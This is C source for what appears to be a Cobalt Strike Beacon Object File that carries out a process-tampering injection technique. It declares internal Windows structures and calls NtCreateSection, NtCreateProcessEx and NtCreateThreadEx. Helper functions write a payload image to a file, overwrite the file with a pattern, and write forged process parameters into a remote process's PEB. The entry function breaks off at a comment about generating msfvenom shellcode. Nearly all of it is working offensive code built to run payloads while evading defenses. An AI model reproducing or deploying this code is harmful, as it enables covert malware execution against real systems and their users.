#include <stdio.h>
#include "bofdefs.h"


typedef LONG KPRIORITY;
typedef int WINBOOL, * PWINBOOL, * LPWINBOOL;
typedef enum _PROCESSINFOCLASS
{
    ProcessBasicInformation, // q: PROCESS_BASIC_INFORMATION, PROCESS_EXTENDED_BASIC_INFORMATION
    ProcessQuotaLimits, // qs: QUOTA_LIMITS, QUOTA_LIMITS_EX
    ProcessIoCounters, // q: IO_COUNTERS
    ProcessVmCounters, // q: VM_COUNTERS, VM_COUNTERS_EX, VM_COUNTERS_EX2
    ProcessTimes, // q: KERNEL_USER_TIMES
    ProcessBasePriority, // s: KPRIORITY
    ProcessRaisePriority, // s: ULONG
    ProcessDebugPort, // q: HANDLE
    ProcessExceptionPort, // s: PROCESS_EXCEPTION_PORT
    ProcessAccessToken, // s: PROCESS_ACCESS_TOKEN
    ProcessLdtInformation, // qs: PROCESS_LDT_INFORMATION // 10
    ProcessLdtSize, // s: PROCESS_LDT_SIZE
    ProcessDefaultHardErrorMode, // qs: ULONG
    ProcessIoPortHandlers, // (kernel-mode only)
    ProcessPooledUsageAndLimits, // q: POOLED_USAGE_AND_LIMITS
    ProcessWorkingSetWatch, // q: PROCESS_WS_WATCH_INFORMATION[]; s: void
    ProcessUserModeIOPL,
    ProcessEnableAlignmentFaultFixup, // s: BOOLEAN
    ProcessPriorityClass, // qs: PROCESS_PRIORITY_CLASS
    ProcessWx86Information,
    ProcessHandleCount, // q: ULONG, PROCESS_HANDLE_INFORMATION // 20
    ProcessAffinityMask, // s: KAFFINITY
    ProcessPriorityBoost, // qs: ULONG
    ProcessDeviceMap, // qs: PROCESS_DEVICEMAP_INFORMATION, PROCESS_DEVICEMAP_INFORMATION_EX
    ProcessSessionInformation, // q: PROCESS_SESSION_INFORMATION
    ProcessForegroundInformation, // s: PROCESS_FOREGROUND_BACKGROUND
    ProcessWow64Information, // q: ULONG_PTR
    ProcessImageFileName, // q: UNICODE_STRING
    ProcessLUIDDeviceMapsEnabled, // q: ULONG
    ProcessBreakOnTermination, // qs: ULONG
    ProcessDebugObjectHandle, // q: HANDLE // 30
    ProcessDebugFlags, // qs: ULONG
    ProcessHandleTracing, // q: PROCESS_HANDLE_TRACING_QUERY; s: size 0 disables, otherwise enables
    ProcessIoPriority, // qs: IO_PRIORITY_HINT
    ProcessExecuteFlags, // qs: ULONG
    ProcessResourceManagement, // ProcessTlsInformation // PROCESS_TLS_INFORMATION
    ProcessCookie, // q: ULONG
    ProcessImageInformation, // q: SECTION_IMAGE_INFORMATION
    ProcessCycleTime, // q: PROCESS_CYCLE_TIME_INFORMATION // since VISTA
    ProcessPagePriority, // q: PAGE_PRIORITY_INFORMATION
    ProcessInstrumentationCallback, // qs: PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION // 40
    ProcessThreadStackAllocation, // s: PROCESS_STACK_ALLOCATION_INFORMATION, PROCESS_STACK_ALLOCATION_INFORMATION_EX
    ProcessWorkingSetWatchEx, // q: PROCESS_WS_WATCH_INFORMATION_EX[]
    ProcessImageFileNameWin32, // q: UNICODE_STRING
    ProcessImageFileMapping, // q: HANDLE (input)
    ProcessAffinityUpdateMode, // qs: PROCESS_AFFINITY_UPDATE_MODE
    ProcessMemoryAllocationMode, // qs: PROCESS_MEMORY_ALLOCATION_MODE
    ProcessGroupInformation, // q: USHORT[]
    ProcessTokenVirtualizationEnabled, // s: ULONG
    ProcessConsoleHostProcess, // q: ULONG_PTR // ProcessOwnerInformation
    ProcessWindowInformation, // q: PROCESS_WINDOW_INFORMATION // 50
    ProcessHandleInformation, // q: PROCESS_HANDLE_SNAPSHOT_INFORMATION // since WIN8
    ProcessMitigationPolicy, // s: PROCESS_MITIGATION_POLICY_INFORMATION
    ProcessDynamicFunctionTableInformation,
    ProcessHandleCheckingMode, // qs: ULONG; s: 0 disables, otherwise enables
    ProcessKeepAliveCount, // q: PROCESS_KEEPALIVE_COUNT_INFORMATION
    ProcessRevokeFileHandles, // s: PROCESS_REVOKE_FILE_HANDLES_INFORMATION
    ProcessWorkingSetControl, // s: PROCESS_WORKING_SET_CONTROL
    ProcessHandleTable, // q: ULONG[] // since WINBLUE
    ProcessCheckStackExtentsMode,
    ProcessCommandLineInformation, // q: UNICODE_STRING // 60
    ProcessProtectionInformation, // q: PS_PROTECTION
    ProcessMemoryExhaustion, // PROCESS_MEMORY_EXHAUSTION_INFO // since THRESHOLD
    ProcessFaultInformation, // PROCESS_FAULT_INFORMATION
    ProcessTelemetryIdInformation, // PROCESS_TELEMETRY_ID_INFORMATION
    ProcessCommitReleaseInformation, // PROCESS_COMMIT_RELEASE_INFORMATION
    ProcessDefaultCpuSetsInformation,
    ProcessAllowedCpuSetsInformation,
    ProcessSubsystemProcess,
    ProcessJobMemoryInformation, // PROCESS_JOB_MEMORY_INFO
    ProcessInPrivate, // since THRESHOLD2 // 70
    ProcessRaiseUMExceptionOnInvalidHandleClose, // qs: ULONG; s: 0 disables, otherwise enables
    ProcessIumChallengeResponse,
    ProcessChildProcessInformation, // PROCESS_CHILD_PROCESS_INFORMATION
    ProcessHighGraphicsPriorityInformation,
    ProcessSubsystemInformation, // q: SUBSYSTEM_INFORMATION_TYPE // since REDSTONE2
    ProcessEnergyValues, // PROCESS_ENERGY_VALUES, PROCESS_EXTENDED_ENERGY_VALUES
    ProcessActivityThrottleState, // PROCESS_ACTIVITY_THROTTLE_STATE
    ProcessActivityThrottlePolicy, // PROCESS_ACTIVITY_THROTTLE_POLICY
    ProcessWin32kSyscallFilterInformation,
    ProcessDisableSystemAllowedCpuSets, // 80
    ProcessWakeInformation, // PROCESS_WAKE_INFORMATION
    ProcessEnergyTrackingState, // PROCESS_ENERGY_TRACKING_STATE
    ProcessManageWritesToExecutableMemory, // MANAGE_WRITES_TO_EXECUTABLE_MEMORY // since REDSTONE3
    ProcessCaptureTrustletLiveDump,
    ProcessTelemetryCoverage,
    ProcessEnclaveInformation,
    ProcessEnableReadWriteVmLogging, // PROCESS_READWRITEVM_LOGGING_INFORMATION
    ProcessUptimeInformation, // PROCESS_UPTIME_INFORMATION
    ProcessImageSection, // q: HANDLE
    ProcessDebugAuthInformation, // since REDSTONE4 // 90
    ProcessSystemResourceManagement, // PROCESS_SYSTEM_RESOURCE_MANAGEMENT
    ProcessSequenceNumber, // q: ULONGLONG
    ProcessLoaderDetour, // since REDSTONE5
    ProcessSecurityDomainInformation, // PROCESS_SECURITY_DOMAIN_INFORMATION
    ProcessCombineSecurityDomainsInformation, // PROCESS_COMBINE_SECURITY_DOMAINS_INFORMATION
    ProcessEnableLogging, // PROCESS_LOGGING_INFORMATION
    ProcessLeapSecondInformation, // PROCESS_LEAP_SECOND_INFORMATION
    ProcessFiberShadowStackAllocation, // PROCESS_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION // since 19H1
    ProcessFreeFiberShadowStackAllocation, // PROCESS_FREE_FIBER_SHADOW_STACK_ALLOCATION_INFORMATION
    MaxProcessInfoClass
} PROCESSINFOCLASS;

typedef ULONG GDI_HANDLE_BUFFER[GDI_HANDLE_BUFFER_SIZE];


typedef struct _STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PCHAR Buffer;
} STRING, * PSTRING, ANSI_STRING, * PANSI_STRING, OEM_STRING, * POEM_STRING;


typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

#define RTL_MAX_DRIVE_LETTERS 32
#define RTL_DRIVE_LETTER_VALID (USHORT)0x0001

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG_PTR EnvironmentSize;
    ULONG_PTR EnvironmentVersion;
    PVOID PackageDependencyData;
    ULONG ProcessGroupId;
    ULONG LoaderThreads;

    UNICODE_STRING RedirectionDllName;
    UNICODE_STRING HeapPartitionName;
    ULONG_PTR DefaultThreadpoolCpuSetMasks;
    ULONG DefaultThreadpoolCpuSetMaskCount;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };

    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PVOID Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID IFEOKey;
    PSLIST_HEADER AtlThunkSListPtr;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ProcessPreviouslyThrottled : 1;
            ULONG ProcessCurrentlyThrottled : 1;
            ULONG ProcessImagesHotPatched : 1; // REDSTONE5
            ULONG ReservedBits0 : 24;
        };
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved;
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];

    PVOID ReadOnlySharedMemoryBase;
    PVOID SharedData; // HotpatchInformation
    PVOID* ReadOnlyStaticServerData;

    PVOID AnsiCodePageData; // PCPTABLEINFO
    PVOID OemCodePageData; // PCPTABLEINFO
    PVOID UnicodeCaseTableData; // PNLSTABLEINFO

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    ULARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps; // PHEAP

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ActiveProcessAffinityMask;
    GDI_HANDLE_BUFFER GdiHandleBuffer;
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo; // APPCOMPAT_EXE_DATA

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData; // ACTIVATION_CONTEXT_DATA
    PVOID ProcessAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP
    PVOID SystemDefaultActivationContextData; // ACTIVATION_CONTEXT_DATA
    PVOID SystemAssemblyStorageMap; // ASSEMBLY_STORAGE_MAP

    SIZE_T MinimumStackCommit;

    PVOID SparePointers[4]; // 19H1 (previously FlsCallback to FlsHighIndex)
    ULONG SpareUlongs[5]; // 19H1
    //PVOID* FlsCallback;
    //LIST_ENTRY FlsListHead;
    //PVOID FlsBitmap;
    //ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    //ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pUnused; // pContextData
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG LibLoaderTracingEnabled : 1;
            ULONG SpareTracingBits : 29;
        };
    };
    ULONGLONG CsrServerReadOnlySharedMemoryBase;
    PRTL_CRITICAL_SECTION TppWorkerpListLock;
    LIST_ENTRY TppWorkerpList;
    PVOID WaitOnAddressHashTable[128];
    PVOID TelemetryCoverageHeader; // REDSTONE3
    ULONG CloudFileFlags;
    ULONG CloudFileDiagFlags; // REDSTONE4
    CHAR PlaceholderCompatibilityMode;
    CHAR PlaceholderCompatibilityModeReserved[7];
    struct _LEAP_SECOND_DATA* LeapSecondData; // REDSTONE5
    union
    {
        ULONG LeapSecondFlags;
        struct
        {
            ULONG SixtySecondEnabled : 1;
            ULONG Reserved : 31;
        };
    };
    ULONG NtGlobalFlag2;
} PEB, * PPEB;


typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef struct _ACTIVATION_CONTEXT_STACK
{
    struct _RTL_ACTIVATION_CONTEXT_STACK_FRAME* ActiveFrame;
    LIST_ENTRY FrameListCache;
    ULONG Flags;
    ULONG NextCookieSequenceNumber;
    ULONG StackId;
} ACTIVATION_CONTEXT_STACK, * PACTIVATION_CONTEXT_STACK;



typedef struct _GDI_TEB_BATCH
{
    ULONG Offset;
    ULONG_PTR HDC;
    ULONG Buffer[GDI_BATCH_BUFFER_SIZE];
} GDI_TEB_BATCH, * PGDI_TEB_BATCH;

typedef struct _TEB
{
    NT_TIB NtTib;

    PVOID EnvironmentPointer;
    CLIENT_ID ClientId;
    PVOID ActiveRpcHandle;
    PVOID ThreadLocalStoragePointer;
    PPEB ProcessEnvironmentBlock;

    ULONG LastErrorValue;
    ULONG CountOfOwnedCriticalSections;
    PVOID CsrClientThread;
    PVOID Win32ThreadInfo;
    ULONG User32Reserved[26];
    ULONG UserReserved[5];
    PVOID WOW32Reserved;
    LCID CurrentLocale;
    ULONG FpSoftwareStatusRegister;
    PVOID ReservedForDebuggerInstrumentation[16];
#ifdef _WIN64
    PVOID SystemReserved1[30];
#else
    PVOID SystemReserved1[26];
#endif

    CHAR PlaceholderCompatibilityMode;
    CHAR PlaceholderReserved[11];
    ULONG ProxiedProcessId;
    ACTIVATION_CONTEXT_STACK ActivationStack;

    UCHAR WorkingOnBehalfTicket[8];
    NTSTATUS ExceptionCode;

    PACTIVATION_CONTEXT_STACK ActivationContextStackPointer;
    ULONG_PTR InstrumentationCallbackSp;
    ULONG_PTR InstrumentationCallbackPreviousPc;
    ULONG_PTR InstrumentationCallbackPreviousSp;
#ifdef _WIN64
    ULONG TxFsContext;
#endif

    BOOLEAN InstrumentationCallbackDisabled;
#ifndef _WIN64
    UCHAR SpareBytes[23];
    ULONG TxFsContext;
#endif
    GDI_TEB_BATCH GdiTebBatch;
    CLIENT_ID RealClientId;
    HANDLE GdiCachedProcessHandle;
    ULONG GdiClientPID;
    ULONG GdiClientTID;
    PVOID GdiThreadLocalInfo;
    ULONG_PTR Win32ClientInfo[62];
    PVOID glDispatchTable[233];
    ULONG_PTR glReserved1[29];
    PVOID glReserved2;
    PVOID glSectionInfo;
    PVOID glSection;
    PVOID glTable;
    PVOID glCurrentRC;
    PVOID glContext;

    NTSTATUS LastStatusValue;
    UNICODE_STRING StaticUnicodeString;
    WCHAR StaticUnicodeBuffer[261];

    PVOID DeallocationStack;
    PVOID TlsSlots[64];
    LIST_ENTRY TlsLinks;

    PVOID Vdm;
    PVOID ReservedForNtRpc;
    PVOID DbgSsReserved[2];

    ULONG HardErrorMode;
#ifdef _WIN64
    PVOID Instrumentation[11];
#else
    PVOID Instrumentation[9];
#endif
    GUID ActivityId;

    PVOID SubProcessTag;
    PVOID PerflibData;
    PVOID EtwTraceData;
    PVOID WinSockData;
    ULONG GdiBatchCount;

    union
    {
        PROCESSOR_NUMBER CurrentIdealProcessor;
        ULONG IdealProcessorValue;
        struct
        {
            UCHAR ReservedPad0;
            UCHAR ReservedPad1;
            UCHAR ReservedPad2;
            UCHAR IdealProcessor;
        };
    };

    ULONG GuaranteedStackBytes;
    PVOID ReservedForPerf;
    PVOID ReservedForOle;
    ULONG WaitingOnLoaderLock;
    PVOID SavedPriorityState;
    ULONG_PTR ReservedForCodeCoverage;
    PVOID ThreadPoolData;
    PVOID* TlsExpansionSlots;
#ifdef _WIN64
    PVOID DeallocationBStore;
    PVOID BStoreLimit;
#endif
    ULONG MuiGeneration;
    ULONG IsImpersonating;
    PVOID NlsCache;
    PVOID pShimData;
    USHORT HeapVirtualAffinity;
    USHORT LowFragHeapDataSlot;
    HANDLE CurrentTransactionHandle;
    PVOID ActiveFrame;
    PVOID FlsData;

    PVOID PreferredLanguages;
    PVOID UserPrefLanguages;
    PVOID MergedPrefLanguages;
    ULONG MuiImpersonation;

    union
    {
        USHORT CrossTebFlags;
        USHORT SpareCrossTebBits : 16;
    };
    union
    {
        USHORT SameTebFlags;
        struct
        {
            USHORT SafeThunkCall : 1;
            USHORT InDebugPrint : 1;
            USHORT HasFiberData : 1;
            USHORT SkipThreadAttach : 1;
            USHORT WerInShipAssertCode : 1;
            USHORT RanProcessInit : 1;
            USHORT ClonedThread : 1;
            USHORT SuppressDebugMsg : 1;
            USHORT DisableUserStackWalk : 1;
            USHORT RtlExceptionAttached : 1;
            USHORT InitialThread : 1;
            USHORT SessionAware : 1;
            USHORT LoadOwner : 1;
            USHORT LoaderWorker : 1;
            USHORT SkipLoaderInit : 1;
            USHORT SpareSameTebBits : 1;
        };
    };

    PVOID TxnScopeEnterCallback;
    PVOID TxnScopeExitCallback;
    PVOID TxnScopeContext;
    ULONG LockCount;
    LONG WowTebOffset;
    PVOID ResourceRetValue;
    PVOID ReservedForWdf;
    ULONGLONG ReservedForCrt;
    GUID EffectiveContainerId;
} TEB, * PTEB;

typedef struct _PROCESS_BASIC_INFORMATION
{
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

WINBASEAPI DWORD WINAPI KERNEL32$GetThreadId(HANDLE Thread);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
NTSYSCALLAPI NTSTATUS WINAPI NTDLL$NtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtCreateProcessEx(PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    ULONG JobMemberLevel
);
WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
WINBASEAPI LPVOID WINAPI KERNEL32$MapViewOfFile(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
WINBASEAPI WINBOOL WINAPI KERNEL32$UnmapViewOfFile(LPCVOID lpBaseAddress);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine, // PUSER_THREAD_START_ROUTINE
    PVOID Argument,
    ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);
NTSYSCALLAPI NTSTATUS NTAPI NTDLL$NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

NTSYSAPI void WINAPI NTDLL$RtlInitUnicodeString(PUNICODE_STRING, PCWSTR);

NTSYSAPI NTSTATUS NTAPI NTDLL$RtlCreateProcessParametersEx(
    PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags // pass RTL_USER_PROC_PARAMS_NORMALIZED to keep parameters normalized
);

BOOL CopyBytesByHandle(PBYTE peBytes,DWORD size,HANDLE targetHandle) {
    DWORD bytesWritten;
    KERNEL32$WriteFile(targetHandle,
        peBytes,
        size,
        &bytesWritten,
        NULL);
    if(bytesWritten == size){
        BeaconPrintf(CALLBACK_OUTPUT,"Successfully written %d bytes on targetFile\n",bytesWritten);
        return TRUE;
    }
    else{
        BeaconPrintf(CALLBACK_OUTPUT,"Not written all bytes. Written %d bytes\n. Aborting...",bytesWritten);
        return FALSE;
    }
}

BOOL MyGetFileSize(HANDLE FileHandle, LARGE_INTEGER* FileSize) {

    FileSize->QuadPart = 0;

    LARGE_INTEGER fileSize;
    if (KERNEL32$GetFileSizeEx(FileHandle, &fileSize) == FALSE) {
        return FALSE;
    }
    FileSize->QuadPart = fileSize.QuadPart;
    return TRUE;

}
BOOL GetImageEntryPointRva(HANDLE FileHandle,DWORD * EntryPointRva){
    *EntryPointRva = 0;

    LARGE_INTEGER fileSize;
    MyGetFileSize(FileHandle, &fileSize);

    ULARGE_INTEGER mappingSize;
    mappingSize.QuadPart = fileSize.QuadPart;

    HANDLE mapping = KERNEL32$CreateFileMappingW(FileHandle, NULL, 0x02, mappingSize.HighPart, mappingSize.LowPart, NULL);
    LPVOID view = KERNEL32$MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, mappingSize.LowPart);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)view;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] DOS_HEADER invalid signature");
        KERNEL32$UnmapViewOfFile(view);
        KERNEL32$CloseHandle(mapping);
        return FALSE;
    }
    PIMAGE_NT_HEADERS32 ntHeader = (PIMAGE_NT_HEADERS32)((LPBYTE)view + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] NT_HEADER invalid signature");
        KERNEL32$UnmapViewOfFile(view);
        KERNEL32$CloseHandle(mapping);
        return FALSE;
    }

    if (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
    {
        *EntryPointRva = ntHeader->OptionalHeader.AddressOfEntryPoint;
    }
    else if (ntHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)
    {
        PIMAGE_NT_HEADERS64 ntHeader64 = (PIMAGE_NT_HEADERS64)(ntHeader);
        *EntryPointRva = ntHeader64->OptionalHeader.AddressOfEntryPoint;
    }
    KERNEL32$UnmapViewOfFile(view);
    KERNEL32$CloseHandle(mapping);    
    return TRUE;
}

BOOL OverwriteFileContentsWithPattern(HANDLE FileHandle, PBYTE pattern, int patternLength) {
    LARGE_INTEGER fileSize;
    MyGetFileSize(FileHandle, &fileSize);
    LARGE_INTEGER toMove;
    toMove.QuadPart = 0;
    if (!KERNEL32$SetFilePointerEx(FileHandle, toMove, NULL, FILE_BEGIN)) {
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed SetFilePointerEx.");
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] Success SetFilePointerEx.\n");
    LONGLONG bytesRemaining = fileSize.QuadPart;
    while (bytesRemaining > 0)
    {
        if (bytesRemaining < patternLength)
        {
            DWORD bytesWritten = 0;
            KERNEL32$WriteFile(FileHandle, pattern, bytesRemaining, &bytesWritten, NULL);
            if(bytesWritten != bytesRemaining){
                BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed WriteFile.\n");
                return FALSE;
            }
            bytesRemaining -= bytesWritten;
        }
        else {
            DWORD bytesWritten = 0;
            KERNEL32$WriteFile(FileHandle, pattern, patternLength, &bytesWritten, NULL);
            if(bytesWritten != patternLength){
                BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed WriteFile.\n");
                return FALSE;
            }
            bytesRemaining -= bytesWritten;
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT,"[+] File successfully overwritten with pattern\n");
    return TRUE;
    
}
BOOL WriteRemoteProcessParameters(
    handle_t ProcessHandle,
    LPWSTR ImageFileName,
    LPWSTR DllPath,
    LPWSTR CurrentDirectory,
    LPWSTR CommandLine,
    void* EnvironmentBlock,
    LPWSTR WindowTitle,
    LPWSTR DesktopInfo,
    LPWSTR ShellInfo,
    LPWSTR RuntimeData)
{
    UNICODE_STRING imageName;
    UNICODE_STRING dllPath;
    UNICODE_STRING commandLine;
    UNICODE_STRING currentDirectory;
    UNICODE_STRING windowTitle;
    UNICODE_STRING desktopInfo;
    UNICODE_STRING shellInfo;
    UNICODE_STRING runtimeData;
    PRTL_USER_PROCESS_PARAMETERS params = NULL;

    NTDLL$RtlInitUnicodeString(&imageName, ImageFileName);
    NTDLL$RtlInitUnicodeString(&dllPath, DllPath);
    NTDLL$RtlInitUnicodeString(&commandLine, CommandLine);
    NTDLL$RtlInitUnicodeString(&currentDirectory, CurrentDirectory);
    NTDLL$RtlInitUnicodeString(&desktopInfo, DesktopInfo);
    NTDLL$RtlInitUnicodeString(&shellInfo, ShellInfo);
    NTDLL$RtlInitUnicodeString(&runtimeData, RuntimeData);
    NTDLL$RtlInitUnicodeString(&windowTitle, WindowTitle);

    PROCESS_BASIC_INFORMATION pbi;

    NTSTATUS res = NTDLL$NtQueryInformationProcess(
        ProcessHandle,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        NULL);

    if(res != NT_SUCCESS){
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed NtQueryInformationProcess.");
        return FALSE;
    }
    
    BeaconPrintf(CALLBACK_OUTPUT,"Success NtQueryInformationProcess.\npbi.UniqueProcessId: %d\npbi.PebBaseAddress: 0x%p\n",pbi.UniqueProcessId,pbi.PebBaseAddress);
    
    
    res = NTDLL$RtlCreateProcessParametersEx(
        &params,
        &imageName,
        NULL,
        NULL,
        &commandLine,
        EnvironmentBlock,
        &windowTitle,
        &desktopInfo,
        NULL,
        NULL,
        0);
    
    if(res != NT_SUCCESS){
        BeaconPrintf(CALLBACK_OUTPUT,"[!] Failed RtlCreateProcessParametersEx. params: 0x%p\n",params);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT,"Success RtlCreateProcessParametersEx. params: 0x%p\n",params);

    SIZE_T len = params->MaximumLength + params->EnvironmentSize;

    LPVOID remoteMemory = KERNEL32$VirtualAllocEx(ProcessHandle,
        NULL,
        len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (params->Environment != NULL)
    {
        //
        // The environment block will always be right after the length, which
        // is the size of RTL_USER_PROCESS_PARAMETERS plus any extra field
        // data.
        //
        params->Environment = (LPBYTE)(remoteMemory)+params->Length;
    }
    KERNEL32$WriteProcessMemory(ProcessHandle,
        remoteMemory,
        params,
        len,
        NULL);

    KERNEL32$WriteProcessMemory(
        ProcessHandle,
        (LPBYTE)pbi.PebBaseAddress +
            FIELD_OFFSET(PEB, ProcessParameters),
        &remoteMemory,
        sizeof(remoteMemory),
        NULL);

    return TRUE;
}

void go(char* buff, int len) {
    datap parser;
    char* peName;
    // Example of creating a raw shellcode payload with msfvenom
